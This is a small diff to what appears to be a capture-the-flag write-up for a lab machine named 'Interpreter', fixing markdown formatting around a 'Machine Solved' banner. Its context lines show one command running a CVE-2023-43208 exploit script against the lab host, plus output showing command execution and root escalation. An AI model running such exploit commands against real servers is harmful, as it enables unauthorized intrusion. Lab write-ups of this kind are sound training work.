@@ -116,6 +116,7 @@ python3 CVE-2023-43208.py -t https://interpreter.htb -c "id"
 
 # Response shows mirth user
 uid=1001(mirth) gid=1001(mirth) groups=1001(mirth)
+```
 
 
 ```bash
@@ -521,9 +522,9 @@ We have **euid=0(root)** - Privilege Escalation successful!
 
 ---
 
-# 🎉 **Machine Solved!**
 <p align="center">
-  
+# 🎉 **Machine Solved!**
+
 ![Machine Solved](solved_machine_banner.PNG)
 </p>
 
